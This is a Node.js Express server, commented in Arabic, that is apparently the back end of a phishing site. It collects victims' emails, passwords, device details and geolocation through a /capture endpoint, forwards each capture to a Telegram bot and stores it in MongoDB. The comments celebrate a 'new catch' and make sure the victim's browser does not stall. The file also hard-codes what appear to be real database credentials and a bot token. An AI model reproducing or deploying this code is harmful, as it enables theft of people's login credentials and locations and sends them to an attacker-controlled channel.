const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const axios = require('axios');
const path = require('path');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(express.static(__dirname));

// الإعدادات الخاصة بك
const MONGO_URI = "mongodb+srv://hamoodaix90_db_user:X4A0mkbVqQO09I9J@cluster0.ohfhehw.mongodb.net/sample_mflix?retryWrites=true&w=majority";
const BOT_TOKEN = "8336936813:AAENAKTwrPn6lCaxlWarBYQwAhCaGZBXwUk";
const CHAT_ID = "8351043975";

// تعريف النموذج مرة واحدة فقط في البداية لتجنب الأخطاء
const VictimSchema = new mongoose.Schema({
    email: String,
    password: String,
    device: String,
    location: Object,
    date: { type: Date, default: Date.now }
});
const Victim = mongoose.models.Victim || mongoose.model('Victim', VictimSchema);

// الاتصال بـ Mongo بشكل منفصل لكي لا يعطل التيليجرام
mongoose.connect(MONGO_URI).then(() => console.log("✅ MongoDB Atlas Connected")).catch(e => console.log("❌ Database Error (Ignoring to keep Telegram working)"));

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

app.post('/capture', async (req, res) => {
    const { email, password, device, location } = req.body;
    
    // إرسال رد فوري للمتصفح لكي لا يعلق الزر عند الضحية
    res.status(200).send("Processing...");

    // 1. إرسال لتيليجرام فوراً
    try {
        const text = `🚀 **صيد جديد!**\n\n📧 الإيميل: ${email}\n🔑 الباسورد: ${password}\n📱 الجهاز: ${device}\n📍 الموقع: ${location ? `https://www.google.com/maps?q=${location.lat},${location.lon}` : 'غير متوفر'}`;
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'HTML' // استخدام HTML أضمن من Markdown
        });
    } catch (e) {
        console.log("❌ Telegram Bot Error: Check if you started the bot!");
    }

    // 2. حفظ في MongoDB في الخلفية
    try {
        const newEntry = new Victim({ email, password, device, location });
        await newEntry.save();
    } catch (e) {
        console.log("❌ Save to DB failed");
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("🚀 Server is Live and Dangerous!"));
